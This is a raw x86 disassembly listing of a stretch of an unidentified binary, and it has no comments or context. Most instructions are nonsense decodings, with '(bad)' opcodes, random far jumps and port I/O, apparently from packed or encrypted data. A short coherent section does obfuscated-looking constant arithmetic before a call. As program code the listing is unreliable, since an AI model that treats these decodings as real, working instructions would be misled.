  41a2e2:	push   edx
  41a2e3:	pop    ebx
  41a2e4:	aas    
  41a2e5:	push   ds
  41a2e6:	cmp    BYTE PTR [edi],bh
  41a2e8:	mov    DWORD PTR [ebx],esi
  41a2ea:	mov    gs,WORD PTR ds:0xc070a10c
  41a2f0:	add    ebx,DWORD PTR [ebp+0x11]
  41a2f3:	xor    ch,ah
  41a2f5:	jmp    0x41a297
  41a2f7:	or     DWORD PTR [ebx-0x5d],ebp
  41a2fa:	fdivr  DWORD PTR [edi+0x13]
  41a2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2fe:	pop    ebx
  41a2ff:	dec    ebp
  41a300:	aas    
  41a301:	repnz cmp ah,BYTE PTR [eax+0x28a52eee]
  41a308:	cld    
  41a309:	fnsave [edx-0x2a87478f]
  41a30f:	push   esp
  41a310:	fwait
  41a311:	scas   eax,DWORD PTR es:[edi]
  41a312:	dec    esp
  41a313:	bound  edx,QWORD PTR [ebp+0x7db0ecc2]
  41a319:	push   ebx
  41a31a:	and    eax,0xfd1ddabd
  41a31f:	out    0x12,eax
  41a321:	dec    eax
  41a322:	nop
  41a323:	ds (bad) 
  41a325:	nop
  41a326:	push   cs
  41a327:	sar    DWORD PTR [eax],1
  41a329:	fs aas 
  41a32b:	sbb    edi,DWORD PTR [edx+0x34]
  41a32e:	xchg   edx,eax
  41a32f:	fdiv   st(6),st
  41a331:	aaa    
  41a332:	loop   0x41a358
  41a334:	ficom  WORD PTR [eax]
  41a336:	push   ss
  41a337:	pop    ss
  41a338:	xchg   ecx,eax
  41a339:	imul   esp,DWORD PTR [ebp+0x69],0xdb73d0c6
  41a340:	and    al,0xaf
  41a342:	mov    eax,ds:0x10219e43
  41a347:	and    cl,BYTE PTR ds:0x1a863aa2
  41a34d:	repnz sub ebx,DWORD PTR [ebx]
  41a350:	jl     0x41a2f6
  41a352:	fs jp  0x41a350
  41a355:	leave  
  41a356:	call   0x630c038b
  41a35b:	pusha  
  41a35c:	cmp    BYTE PTR [ebx-0x45be2010],dh
  41a362:	add    BYTE PTR [ebx],0xd2
  41a365:	xor    eax,0x146d31bb
  41a36a:	mov    esp,0x5e14f9be
  41a36f:	adc    DWORD PTR [eax+0x25],ebx
  41a372:	in     al,dx
  41a373:	data16 cmp al,0xe2
  41a376:	jle    0x41a3b4
  41a378:	push   0x9ef8c637
  41a37d:	pop    esi
  41a37e:	outs   dx,BYTE PTR ds:[esi]
  41a37f:	mov    edx,0xc0af6995
  41a384:	mov    dl,0x75
  41a386:	das    
  41a387:	and    BYTE PTR [ecx+0x7577ab89],ah
  41a38d:	push   edx
  41a38e:	enter  0x7f6f,0xe
  41a392:	sar    al,cl
  41a394:	push   ds
  41a395:	xchg   ebx,edi
  41a397:	leave  
  41a398:	call   0x569954ca
  41a39d:	mov    eax,0xc337ce93
  41a3a2:	sub    cl,ch
  41a3a4:	or     al,0xfc
  41a3a6:	jmp    0x103d:0xc3908406
  41a3ad:	mov    ebp,0x3b0a0bf2
  41a3b2:	addr16 or eax,0xe1517c6d
  41a3b8:	pop    edx
  41a3b9:	test   DWORD PTR [esi+ebp*1+0x10],ebx
  41a3bd:	mov    bl,0x32
  41a3bf:	dec    ebx
  41a3c0:	push   ebx
  41a3c1:	loop   0x41a3d8
  41a3c3:	cmp    eax,0xe9acb1b6
  41a3c8:	std    
  41a3c9:	loope  0x41a433
  41a3cb:	sti    
  41a3cc:	aad    0x5c
  41a3ce:	xchg   ebx,eax
  41a3cf:	adc    eax,0xb2e701a2
  41a3d4:	push   edi
  41a3d5:	mov    DWORD PTR [edi],edi
  41a3d7:	dec    ebx
  41a3d8:	pop    edi
  41a3d9:	jl     0x41a3f2
  41a3db:	loop   0x41a41c
  41a3dd:	daa    
  41a3de:	iret   
  41a3df:	sti    
  41a3e0:	push   ds
  41a3e1:	push   0x868559e0
  41a3e6:	scas   al,BYTE PTR es:[edi]
  41a3e7:	(bad)  
  41a3e8:	das    
  41a3e9:	mov    ebp,0x67a00a0d
  41a3ee:	aad    0x58
  41a3f0:	add    al,0x7d
  41a3f2:	outs   dx,DWORD PTR ds:[esi]
  41a3f3:	out    0x4a,eax
  41a3f5:	jbe    0x41a381
  41a3f7:	mul    BYTE PTR [ebx-0x2708ad88]
  41a3fd:	pop    edi
  41a3fe:	mov    bh,0x6b
  41a400:	lahf   
  41a401:	xor    ecx,edi
  41a403:	or     eax,ebp
  41a405:	sub    BYTE PTR [ebp-0x75556677],al
  41a40b:	in     eax,dx
  41a40c:	mov    eax,es
  41a40e:	and    eax,0x37a92ce1
  41a413:	inc    edi
  41a414:	pop    ebx
  41a415:	pop    ebp
  41a416:	push   ds
  41a417:	mov    al,ds:0x8caf3a36
  41a41c:	mov    bh,0xe9
  41a41e:	xlat   BYTE PTR ds:[ebx]
  41a420:	mov    edi,0x89c2a953
  41a425:	cmc    
  41a426:	mov    ebx,edx
  41a428:	jmp    0x6fa1:0x43fa7b2
  41a42f:	int3   
  41a430:	adc    DWORD PTR [esi],ebp
  41a432:	lock ret 0x248
  41a436:	shl    BYTE PTR [esi],0x29
  41a439:	rol    al,0xae
  41a43c:	add    al,0x39
  41a43e:	repz ret 0xc598
  41a442:	call   0x9865:0xa25d3521
  41a449:	fimul  DWORD PTR [edx-0x9]
  41a44c:	aas    
  41a44d:	pop    eax
  41a44e:	shld   esp,edx,0xdf
  41a452:	jge    0x41a48f
  41a454:	cmc    
  41a455:	lods   eax,DWORD PTR ds:[esi]
  41a456:	push   ss
  41a457:	loopne 0x41a3dc
  41a459:	pop    ebp
  41a45a:	jne    0x41a3dd
  41a45c:	aaa    
  41a45d:	pop    esp
  41a45e:	pop    esi
  41a45f:	dec    eax
  41a460:	push   0xca367750
  41a465:	sub    cl,BYTE PTR [esi]
  41a467:	cmp    al,0x24
  41a469:	inc    esi
  41a46a:	jp     0x41a4e3
  41a46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a46d:	out    dx,al
  41a46e:	inc    edi
  41a46f:	or     ebp,DWORD PTR [edi-0xb]
  41a472:	and    BYTE PTR [edx],bh
  41a474:	push   ds
  41a475:	jb     0x41a438
  41a477:	ins    DWORD PTR es:[edi],dx
  41a478:	inc    DWORD PTR [ecx]
  41a47a:	and    eax,0x336c1bb
  41a47f:	div    DWORD PTR ds:[ebx-0x15]
  41a483:	mov    dl,0x6e
  41a485:	dec    ebp
  41a486:	jp     0x41a454
  41a488:	(bad)  
  41a489:	sub    al,0xc
  41a48b:	adc    bh,cl
  41a48d:	retf   
  41a48e:	xor    ch,BYTE PTR [ebx+0x4a]
  41a491:	push   ss
  41a492:	popa   
  41a493:	fsubp  st(6),st
  41a495:	lods   eax,DWORD PTR ds:[esi]
  41a496:	and    dl,ah
  41a498:	outs   dx,DWORD PTR ds:[esi]
  41a499:	mov    ecx,0x19a27597
  41a49e:	mov    eax,0x5def9324
  41a4a3:	dec    ebx
  41a4a4:	dec    ecx
  41a4a5:	mov    ecx,esp
  41a4a7:	mov    ds:0x5bf0a9f8,eax
  41a4ac:	sti    
  41a4ad:	out    dx,al
  41a4ae:	jns    0x41a49f
  41a4b0:	out    0x4c,al
  41a4b2:	adc    eax,0x7561c3da
  41a4b7:	cmc    
  41a4b8:	mov    al,ds:0xd30f76d6
  41a4be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4bf:	je     0x41a4c9
  41a4c1:	mov    BYTE PTR [edi+0x75612d9],dl
  41a4c7:	ss in  eax,dx
  41a4c9:	das    
  41a4ca:	push   esp
  41a4cb:	add    al,0x9f
  41a4cd:	out    dx,eax
  41a4ce:	scas   eax,DWORD PTR es:[edi]
  41a4cf:	daa    
  41a4d0:	adc    eax,0xea01863a
  41a4d5:	and    al,0xe5
  41a4d7:	push   es
  41a4d8:	jecxz  0x41a46e
  41a4da:	dec    esi
  41a4db:	adc    al,0x21
  41a4dd:	mov    ebp,0x9a858e5d
  41a4e2:	leave  
  41a4e3:	push   0xb45f74b7
  41a4e8:	cmp    BYTE PTR [ebp+0x6d],bh
  41a4eb:	ja     0x41a536
  41a4ed:	sbb    BYTE PTR [eax+0x4e],cl
  41a4f0:	pushf  
  41a4f1:	push   esp
  41a4f2:	xor    ch,cl
  41a4f4:	adc    ecx,DWORD PTR [esp+ebx*4-0x5e]
  41a4f8:	pop    esp
  41a4f9:	pop    esp
  41a4fa:	in     al,dx
  41a4fb:	sub    cl,al
  41a4fd:	mov    cl,0xa6
  41a4ff:	es repnz xchg ebx,eax
  41a502:	ror    eax,cl
  41a504:	push   ds
  41a505:	ret    
  41a506:	jae    0x41a4e8
  41a508:	sahf   
  41a509:	xchg   esi,eax
  41a50a:	fldcw  WORD PTR [edi]
  41a50c:	cwde   
  41a50d:	mov    ah,BYTE PTR [edi+0x1d2d3de7]
  41a513:	jmp    0xdfe4:0x724eddd9
  41a51a:	xor    ch,BYTE PTR [esi-0x50]
  41a51d:	mov    bl,0xcb
  41a51f:	jnp    0x41a4a4
  41a521:	outs   dx,DWORD PTR ds:[esi]
  41a523:	pop    ecx
  41a524:	test   DWORD PTR [eax],edi
  41a526:	fisub  DWORD PTR [edi+0x373dff39]
  41a52c:	out    dx,al
  41a52d:	fstp   TBYTE PTR [edx-0x39627614]
  41a533:	cmp    eax,0x8a415da7
  41a538:	push   ds
  41a539:	add    ecx,DWORD PTR [edx]
  41a53b:	test   DWORD PTR [ecx+eiz*2-0x59],edi
  41a53f:	mov    ecx,DWORD PTR [eax+edx*1+0x35]
  41a543:	outs   dx,DWORD PTR ds:[esi]
  41a544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a545:	dec    edx
  41a546:	inc    esp
  41a547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a548:	sub    BYTE PTR [ebx-0x7b],dh
  41a54b:	enter  0xc787,0x29
  41a54f:	lds    edx,FWORD PTR [esp+edx*4]
  41a552:	fnstcw WORD PTR [edi+0xb]
  41a555:	mov    BYTE PTR [ecx],dh
  41a557:	popa   
  41a558:	mov    ecx,0x19a6be
  41a55d:	cmp    ah,BYTE PTR [ecx]
  41a55f:	lahf   
  41a560:	add    ecx,edx
  41a562:	dec    ecx
  41a563:	and    ah,BYTE PTR [edi-0x57]
  41a566:	cmp    dl,BYTE PTR [ebx-0x57]
  41a569:	cmp    ch,ch
  41a56b:	dec    eax
  41a56c:	pop    es
  41a56d:	fidivr WORD PTR [eax]
  41a56f:	push   cs
  41a570:	adc    DWORD PTR [ecx+0x9d5d2f0],edi
  41a576:	test   DWORD PTR [edi-0x7],0x4da625ef
  41a57d:	loope  0x41a517
  41a57f:	hlt    
  41a580:	add    esp,DWORD PTR [ecx+0x324bd10b]
  41a586:	jg     0x41a522
  41a588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a589:	add    DWORD PTR [edx],edx
  41a58b:	mov    ebp,0x81e9fb18
  41a590:	xlat   BYTE PTR ds:[ebx]
  41a591:	xor    eax,0x6dd7da93
  41a596:	ss imul edx,edi,0xff3c7ade
  41a59d:	ja     0x41a57d
  41a59f:	or     al,0x8e
  41a5a1:	aas    
  41a5a2:	push   ecx
  41a5a3:	test   eax,0x4c7d5ec
  41a5a8:	sbb    BYTE PTR [ebp+0x3f],ah
  41a5ab:	jae    0x41a5ef
  41a5ad:	pusha  
  41a5ae:	jb     0x41a5dd
  41a5b0:	ret    
  41a5b1:	xor    eax,0x1e486522
  41a5b6:	add    BYTE PTR [edi],dl
  41a5b8:	add    BYTE PTR [ebp+0x2b],bh
  41a5bb:	xchg   ebx,eax
  41a5bc:	inc    ebx
  41a5bd:	pop    ecx
  41a5be:	stos   DWORD PTR es:[edi],eax
  41a5bf:	fld    QWORD PTR [ecx+0x46]
  41a5c2:	shl    dl,1
  41a5c4:	jmp    0xc613:0xb4cfedbc
  41a5cb:	mov    ecx,DWORD PTR [ecx]
  41a5cd:	jle    0x41a5bf
  41a5cf:	shl    BYTE PTR [edi+eiz*8],0xa7
  41a5d3:	and    ah,BYTE PTR [edi+0x59]
  41a5d6:	xchg   ebx,eax
  41a5d7:	xchg   ecx,eax
  41a5d8:	cs push edi
  41a5da:	pop    DWORD PTR [edi+0x8]
  41a5dd:	lea    ebx,[esi+0xdb38e33]
  41a5e3:	dec    edx
  41a5e4:	jae    0x41a626
  41a5e6:	cmp    eax,0x7eb20b90
  41a5eb:	(bad)  
  41a5ec:	(bad)  
  41a5ee:	or     BYTE PTR [edi],0xcf
  41a5f1:	shl    edx,1
  41a5f3:	jbe    0x41a66e
  41a5f5:	mov    ecx,0x7c38ada3
  41a5fa:	pop    ebp
  41a5fb:	push   esp
  41a5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5fd:	call   0x9c7ef86d
  41a602:	jmp    0x2e9e29fd
  41a607:	scas   eax,DWORD PTR es:[edi]
  41a608:	cld    
  41a609:	xchg   ecx,eax
  41a60a:	int3   
  41a60b:	dec    esp
  41a60c:	sub    al,0x9e
  41a60e:	data16 je 0x41a631
  41a611:	retf   0xc29f
  41a614:	enter  0x7bfa,0x28
  41a618:	or     DWORD PTR [ebx-0x46],eax
  41a61b:	cmp    dl,BYTE PTR [eax+0x33e7c3fd]
  41a621:	popf   
  41a622:	pop    esi
  41a623:	test   eax,0x326e143b
  41a628:	call   0xb7b5:0x9f533b42
  41a62f:	fld    DWORD PTR [ecx]
  41a631:	mov    bl,0x42
  41a633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a634:	(bad)  
  41a635:	push   cs
  41a636:	outs   dx,DWORD PTR ds:[esi]
  41a637:	or     al,0xfc
  41a639:	cdq    
  41a63a:	imul   ebp,DWORD PTR [edi-0x10666889],0x32da3728
  41a644:	inc    ebp
  41a645:	call   0xdd2b512
  41a64a:	(bad)  
  41a64b:	ja     0x41a5fc
  41a64d:	or     ebx,DWORD PTR [ecx+0x64dc3040]
  41a653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a654:	inc    edx
  41a655:	(bad)  
  41a656:	mov    cl,0xe7
  41a658:	mov    ebx,DWORD PTR [ebx+0x2d29396b]
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x422046
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	std    
  41a749:	int    0xcf
  41a74b:	jo     0x41a71c
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x10ef1818],bh
  41a756:	cmc    
  41a757:	xor    BYTE PTR [eax+0x23],ah
  41a75a:	adc    BYTE PTR [ebx+esi*1],dl
  41a75d:	cmp    ah,dh
  41a75f:	ret    0x181e
  41a762:	dec    edi
  41a763:	adc    bh,BYTE PTR [ebp+ebx*1+0x11]
  41a767:	fcom   st(4)
  41a769:	xchg   edi,eax
  41a76a:	in     al,0xb8
  41a76c:	pop    ebx
  41a76d:	xor    eax,0x9d790127
  41a772:	cmp    dl,dh
  41a774:	shl    BYTE PTR [eax-0xb07eeb4],cl
  41a77a:	cmp    ch,dh
  41a77c:	test   DWORD PTR [edi+0x6b169bb4],ebx
  41a782:	cdq    
  41a783:	pop    ebp
  41a784:	lods   al,BYTE PTR ds:[esi]
  41a785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a786:	dec    ebx
  41a787:	sub    eax,0xd48eeb8a
  41a78c:	mov    esi,0x5a96ff93
  41a791:	sti    
  41a792:	jp     0x41a7df
  41a794:	or     al,0x12
  41a796:	push   0xf3d799b0
  41a79b:	aaa    
  41a79c:	sbb    DWORD PTR [ecx+0x3e376f7c],ebp
  41a7a2:	mov    ah,0xe
  41a7a4:	dec    ecx
  41a7a5:	sbb    eax,0x3540c388
  41a7aa:	out    dx,al
  41a7ab:	lds    edx,FWORD PTR [ecx]
  41a7ad:	cwde   
  41a7ae:	inc    eax
  41a7af:	sbb    bl,BYTE PTR [ecx]
  41a7b1:	lods   al,BYTE PTR ds:[esi]
  41a7b2:	push   ebx
  41a7b3:	push   ecx
  41a7b4:	adc    cl,BYTE PTR [edi+0x3959f4e1]
  41a7ba:	repnz ins BYTE PTR es:[edi],dx
  41a7bc:	icebp  
  41a7bd:	or     dh,cl
  41a7bf:	add    DWORD PTR [ebp+0x58],0xc969d356
  41a7c6:	add    BYTE PTR [ecx+0x63e19c39],0xad
  41a7cd:	adc    eax,0x419d026d
  41a7d2:	dec    DWORD PTR [ecx+ecx*2-0x2c]
  41a7d6:	fild   WORD PTR [ebp-0xfd95a22]
  41a7dc:	and    ebp,ecx
  41a7de:	and    DWORD PTR [ecx+0x42b84c4],edi
  41a7e4:	jbe    0x41a83a
  41a7e6:	fs jns 0x41a857
  41a7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ea:	movlps xmm1,QWORD PTR [edx-0x5f53df2b]
  41a7f1:	js     0x41a86c
  41a7f3:	jp     0x41a86f
  41a7f5:	mov    bh,0xd
  41a7f7:	xchg   BYTE PTR [ebx+0x24],dl
  41a7fa:	and    eax,0xade1b8f8
  41a7ff:	(bad)  
  41a800:	iret   
  41a801:	push   es
  41a802:	xchg   DWORD PTR [esi-0x7989ac3a],edx
  41a808:	mov    dh,0x57
  41a80a:	mov    bh,bh
  41a80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80d:	adc    DWORD PTR [edi+edi*8-0x2c884eba],0xfffffff1
  41a815:	mov    ebx,?
  41a817:	jmp    0x41a7c4
  41a819:	retf   
  41a81a:	push   0x7b
  41a81c:	dec    ecx
  41a81d:	xchg   ebp,eax
  41a81e:	stos   BYTE PTR es:[edi],al
  41a81f:	call   0xacdf:0x84d746cb
  41a826:	jb     0x41a840
  41a828:	fisttp DWORD PTR [ecx]
  41a82a:	jbe    0x41a83f
  41a82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a82d:	out    dx,al
  41a82e:	sti    
  41a82f:	cmp    DWORD PTR [edx+0x3247d120],edx
  41a835:	inc    edx
  41a836:	sbb    BYTE PTR [ebp+0x77],al
  41a839:	out    dx,al
  41a83a:	add    DWORD PTR [ecx],ebx
  41a83c:	inc    ecx
  41a83d:	adc    al,0x7
  41a83f:	out    0xdc,eax
  41a841:	frstor [edi-0x57]
  41a844:	rcr    BYTE PTR [edx+0x7a],0x1
  41a848:	mov    ds:0x15611321,eax
  41a84d:	test   DWORD PTR [esi+0x61c6bc1b],0xc1031b53
  41a857:	out    dx,eax
  41a858:	and    BYTE PTR ds:0x2b715977,ch
  41a85e:	pop    ebx
  41a85f:	or     edx,edx
  41a861:	mov    dh,0x9c
  41a863:	push   0xffffffc1
  41a865:	add    DWORD PTR [edi+0x5f],0xee89fc44
  41a86c:	rcl    DWORD PTR [ecx-0x5e5c42f1],cl
  41a872:	or     dh,BYTE PTR [ecx-0x3d]
  41a875:	scas   al,BYTE PTR es:[edi]
  41a876:	jl     0x41a85e
  41a878:	cmp    DWORD PTR [esi+eax*2-0x484d06ef],esi
  41a87f:	je     0x41a8ba
  41a881:	and    al,BYTE PTR [ebx-0x580c985f]
  41a887:	imul   ecx,edi,0xffffffdc
  41a88a:	sbb    ah,bh
  41a88c:	pop    edi
  41a88d:	and    dl,BYTE PTR [edx+0x5dd09e0d]
  41a893:	sub    edx,DWORD PTR [ecx+0x5ae80bef]
  41a899:	ret    0xb728
  41a89c:	push   esi
  41a89d:	lds    ebp,FWORD PTR [ecx-0xe]
  41a8a0:	mov    eax,0x9e228361
  41a8a5:	sub    bh,BYTE PTR [edx-0x4552edbe]
  41a8ab:	push   esi
  41a8ac:	fld    QWORD PTR [ecx-0xe]
  41a8af:	cmp    al,0xa8
  41a8b1:	mov    BYTE PTR [edx],bl
  41a8b3:	sbb    eax,0x969014b5
  41a8b8:	mov    BYTE PTR [edx-0x1f],al
  41a8bb:	jns    0x41a856
  41a8bd:	sub    ah,al
  41a8bf:	add    BYTE PTR ds:0xc904f546,0x98
  41a8c6:	sti    
  41a8c7:	int3   
  41a8c8:	jle    0x41a870
  41a8ca:	aaa    
  41a8cb:	xor    ch,BYTE PTR [esi+ebx*8+0x66]
  41a8cf:	or     eax,0x82597b1c
  41a8d4:	adc    al,0x6e
  41a8d6:	je     0x41a877
  41a8d8:	xchg   edx,eax
  41a8d9:	out    0xf3,al
  41a8db:	mov    al,0xfc
  41a8dd:	test   DWORD PTR [edx+0xafa01bc],esi
  41a8e3:	aas    
  41a8e4:	pop    ss
  41a8e5:	out    dx,al
  41a8e6:	pop    es
  41a8e7:	xchg   ebx,eax
  41a8e8:	mov    al,0x25
  41a8ea:	in     eax,0x96
  41a8ec:	lds    ecx,FWORD PTR [ebx+0x68]
  41a8ef:	push   ds
  41a8f0:	push   es
  41a8f1:	and    eax,0x8e088202
  41a8f6:	out    0x84,al
  41a8f8:	pop    eax
  41a8f9:	push   esp
  41a8fa:	and    esp,DWORD PTR [esi+0x3e9c766]
  41a900:	jmp    0x41a8d7
  41a902:	ret    0x89cd
  41a905:	xchg   esp,eax
  41a906:	(bad)  
  41a907:	mov    ebx,0xa81e30de
  41a90c:	and    eax,0x337e940b
  41a911:	xor    eax,DWORD PTR [ecx+0x2]
  41a914:	adc    DWORD PTR [ecx-0x50],ebp
  41a917:	push   ds
  41a918:	push   edi
  41a919:	push   es
  41a91a:	add    BYTE PTR [edx+0x1a],ch
  41a91d:	jns    0x41a8cc
  41a91f:	xchg   edx,eax
  41a920:	xchg   ebp,eax
  41a921:	push   cs
  41a922:	jae    0x41a8fa
  41a924:	test   al,0xe3
  41a926:	shl    DWORD PTR [edi+0x40],0x9d
  41a92a:	mov    cl,0x77
  41a92c:	sub    DWORD PTR [esi-0xdb67b7c],eax
  41a932:	xchg   ebp,eax
  41a933:	sub    bl,BYTE PTR [eax]
  41a935:	sub    edx,ebp
  41a937:	pop    es
  41a938:	mov    dl,0xe3
  41a93a:	and    al,0x4c
  41a93c:	inc    edx
  41a93d:	rol    esp,cl
  41a93f:	(bad)
  41a943:	jne    0x41a96c
  41a945:	xchg   ebx,eax
  41a946:	and    eax,0x5effed02
  41a94b:	jb     0x41a97c
  41a94d:	cmp    BYTE PTR [ebx],ah
  41a94f:	or     bl,BYTE PTR [esi]
  41a951:	std    
  41a952:	cmc    
  41a953:	out    0x8c,eax
  41a955:	fsubrp st(4),st
  41a957:	icebp  
  41a958:	shr    BYTE PTR [eax+0x5c00e386],1
  41a95e:	pop    eax
  41a95f:	push   ebp
  41a960:	das    
  41a961:	mov    ecx,0x10131c28
  41a966:	cmp    al,dl
  41a968:	sub    al,0xf4
  41a96a:	stos   DWORD PTR es:[edi],eax
  41a96b:	push   edi
  41a96c:	sub    DWORD PTR [ebp+0x5e],0xe4d73949
  41a973:	mov    al,ds:0xee60cb72
  41a978:	mov    WORD PTR [ebp-0x4aae1725],gs
  41a97e:	sbb    BYTE PTR [edx-0x6ba4db11],ch
  41a984:	dec    ebp
  41a985:	and    DWORD PTR [ebx],ebx
  41a987:	idiv   BYTE PTR [eax]
  41a989:	cmc    
  41a98a:	outs   dx,BYTE PTR ds:[esi]
  41a98b:	adc    BYTE PTR [ecx+edx*8-0x28],dl
  41a98f:	cmp    esi,ebx
  41a991:	out    dx,al
  41a992:	push   DWORD PTR [ecx+0x3d0b48c1]
  41a998:	ds sub al,0xac
  41a99b:	je     0x41a9ee
  41a99d:	out    0xce,al
  41a99f:	add    BYTE PTR [ebx],0x22
  41a9a2:	jbe    0x41aa08
  41a9a4:	mov    cs:0x646b3da2,eax
  41a9aa:	mov    ds:0x3de015b0,al
  41a9af:	inc    ebx
  41a9b0:	adc    al,0x98
  41a9b2:	call   0x9a5b6ce
  41a9b7:	mov    bl,0x26
  41a9b9:	popf   
  41a9ba:	loope  0x41a9a2
  41a9bc:	sbb    BYTE PTR [edx],bl
  41a9be:	dec    esp
  41a9bf:	adc    eax,0x35557bcb
  41a9c4:	add    BYTE PTR [ebx+0x2f93ac5],0x1f
  41a9cb:	cld    
  41a9cc:	cdq    
  41a9cd:	lods   eax,DWORD PTR ds:[esi]
  41a9ce:	es pop ds
  41a9d0:	lea    esp,[esi-0x3fcf3075]
  41a9d6:	cmp    al,BYTE PTR [eax]
  41a9d8:	cmp    ecx,DWORD PTR [ebx+0x327aa82a]
  41a9de:	dec    esp
  41a9df:	adc    al,0x75
  41a9e1:	pop    esi
  41a9e2:	(bad)  
  41a9e3:	test   al,0x5f
  41a9e5:	xor    ebp,eax
  41a9e7:	inc    esp
  41a9e8:	loope  0x41a9a8
  41a9ea:	xchg   ebp,eax
  41a9eb:	pop    ebp
  41a9ec:	dec    ecx
  41a9ed:	sbb    BYTE PTR [ebx-0x959abc5],ah
  41a9f3:	in     al,dx
  41a9f4:	cmp    BYTE PTR [ecx+0x25],0x6f
  41a9f8:	adc    al,0x36
  41a9fa:	ja     0xeb030cc9
  41aa00:	retf   
  41aa01:	push   esi
  41aa02:	mov    dh,BYTE PTR ds:0xfd20475c
  41aa08:	sub    bl,BYTE PTR [edi+0x31]
  41aa0b:	sar    BYTE PTR [edx],cl
  41aa0d:	(bad)
  41aa11:	es popfw 
  41aa14:	in     al,0xda
  41aa16:	add    eax,0xd8124097
  41aa1b:	push   ecx
  41aa1c:	not    BYTE PTR [edi+0x363178ba]
  41aa22:	jo     0x41aa8d
  41aa24:	adc    DWORD PTR [esi+ecx*2-0x44],ebp
  41aa28:	sbb    al,bl
  41aa2a:	lahf   
  41aa2b:	lea    esp,[esi+0x27]
  41aa2e:	int3   
  41aa2f:	fimul  WORD PTR [esi+0x3c823f65]
  41aa35:	dec    esp
  41aa36:	pop    ss
  41aa37:	cmc    
  41aa38:	dec    edi
  41aa39:	cmp    eax,0xec290caf
  41aa3e:	dec    BYTE PTR [ebx+ebp*1-0x6d46a245]
  41aa45:	test   al,0x78
  41aa47:	cld    
  41aa48:	push   cs
  41aa49:	pop    eax
  41aa4a:	fiadd  WORD PTR [esi]
  41aa4c:	xchg   edx,eax
  41aa4d:	cmp    ebx,DWORD PTR [esi+0x41]
  41aa50:	js     0x41a9f7
  41aa52:	or     bh,BYTE PTR ds:[edx+ecx*2+0x26]
  41aa57:	cmp    bh,BYTE PTR [edx-0x50]
  41aa5a:	daa    
  41aa5b:	adc    DWORD PTR [esi],0x95d9f4d3
  41aa61:	das    
  41aa62:	xor    BYTE PTR [ebx],bl
  41aa64:	jmp    0x41aa3f
  41aa66:	xchg   edi,eax
  41aa67:	inc    eax
  41aa68:	xor    BYTE PTR [ebx+0x5d],0xa
  41aa6c:	xchg   esi,eax
  41aa6d:	nop
  41aa6e:	add    BYTE PTR [edx-0x41],dh
  41aa71:	stc    
  41aa72:	fdiv   DWORD PTR [edx]
  41aa74:	dec    edx
  41aa75:	mov    dl,0xe6
  41aa77:	cmp    eax,0x206ff9a6
  41aa7c:	imul   edx,DWORD PTR [esi],0x439bb840
  41aa82:	fadd   DWORD PTR [eax+edi*1+0x3]
  41aa86:	rol    BYTE PTR [ebx-0x72],0xa1
  41aa8a:	(bad)
  41aa8d:	jmp    0xb154:0x4ef1acc6
  41aa94:	xchg   ebp,eax
  41aa95:	(bad)  
  41aa96:	jmp    0x85e5:0xad1a4fc3
  41aa9d:	fwait
  41aa9e:	scas   eax,DWORD PTR es:[edi]
  41aa9f:	inc    esi
  41aaa0:	in     eax,dx
  41aaa1:	adc    al,0xcd
  41aaa3:	mov    dh,0xde
  41aaa5:	dec    eax
  41aaa6:	nop
  41aaa7:	loope  0x41aa7b
  41aaa9:	inc    esi
  41aaaa:	pop    edx
  41aaab:	gs add al,0x29
  41aaae:	mov    al,0x8e
